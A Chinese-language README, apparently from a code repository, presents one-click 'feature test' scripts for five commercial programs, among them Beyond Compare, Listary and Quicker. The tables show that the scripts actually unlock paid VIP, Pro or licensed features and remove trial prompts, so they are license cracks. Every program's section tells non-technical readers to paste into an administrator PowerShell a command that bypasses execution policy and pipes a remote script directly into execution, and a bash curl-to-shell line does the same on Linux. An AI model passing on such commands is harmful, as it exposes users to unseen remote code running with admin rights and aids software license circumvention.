# 软件功能实测（一键运行）

这里收了几款常用软件的实测包。每一个都能用**一条命令**跑起来，跑完直接打开软件看效果，
用来确认这些功能到底能不能正常使用。

不需要懂技术：**复制命令 → 粘贴 → 回车**，剩下的交给它自己跑。

---

## 开始之前

- 电脑：Windows 10 / 11
- 有些步骤需要管理员权限，系统弹窗时点「是」
- 会联网下载文件，国内网络可能慢一点，多等一会儿

## 怎么跑（一次只跑一个）

1. 从下面复制你要试的那个软件的命令
2. 点开始菜单 → 输入 `PowerShell` → 右键「以管理员身份运行」
3. 把命令粘贴进去，按回车
4. 等到屏幕上出现 `done`，就完成了

## 五个软件

| 软件 | 干什么用的 | 跑完能看到什么 |
| :--- | :--- | :--- |
| **HexHub** | 连服务器、传文件的工具 | 桌面出现一个免安装文件夹，双击打开后会员标记点亮、会员功能可用 |
| **Listary** | 电脑文件快速搜索 | 软件以专业版打开，标题显示 Pro，高级搜索等功能可用 |
| **Beyond Compare** | 文件、文件夹对比工具 | 打开后不再提示试用到期，全部对比功能可用 |
| **Quicker** | 快捷操作、效率工具 | 任务栏出现图标，会员等级显示专业版，各项功能放开 |
| **妙妙屋X** | 服务器节点管理面板 | 浏览器打开面板，显示专业版，可继续添加用户和服务器 |

> 命令比较长，下面按软件逐条列出，直接复制整行即可。

### 1. HexHub

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/Xioaruan912/ReverseFinal/main/oneclick/hexhub-vip-test.ps1 | iex"
```

### 2. Listary

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/Xioaruan912/ReverseFinal/main/oneclick/listary-pro-test.ps1 | iex"
```

### 3. Beyond Compare

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/Xioaruan912/ReverseFinal/main/oneclick/beyondcompare-license-test.ps1 | iex"
```

### 4. Quicker

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/Xioaruan912/ReverseFinal/main/oneclick/quicker-vip-test.ps1 | iex"
```

### 5. 妙妙屋X

Windows：

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/Xioaruan912/ReverseFinal/main/oneclick/miaomiaowux-license-test.ps1 | iex"
```

Linux：

```bash
bash <(curl -fsSL https://raw.githubusercontent.com/Xioaruan912/ReverseFinal/main/oneclick/miaomiaowux-license-test.sh)
```

---

## 跑完不想要了怎么删

| 软件 | 删除方式 |
| :--- | :--- |
| HexHub | 删掉桌面上的 `HexHub-5.1.9` 文件夹 |
| Beyond Compare | 删掉桌面上的 `BeyondCompare-5.2.6` 文件夹 |
| Listary | 控制面板 → 程序和功能 → 卸载 Listary |
| Quicker | 控制面板 → 程序和功能 → 卸载 Quicker |
| 妙妙屋X | 执行命令：`systemctl disable --now mmwx && rm -rf /opt/mmwx` |

---

## 常见问题

- **下载很慢 / 卡住**：换网络，或过一会儿把同一条命令重跑一次。
- **提示权限不足**：一定要用「以管理员身份运行」打开 PowerShell。
- **想装到别的盘**：看对应软件文件夹里的《使用说明.txt》。
- **报错了**：把屏幕上红色的文字截图，发给技术人员。

每个软件文件夹里都有一份更细的《使用说明.txt》，内容一样是白话。
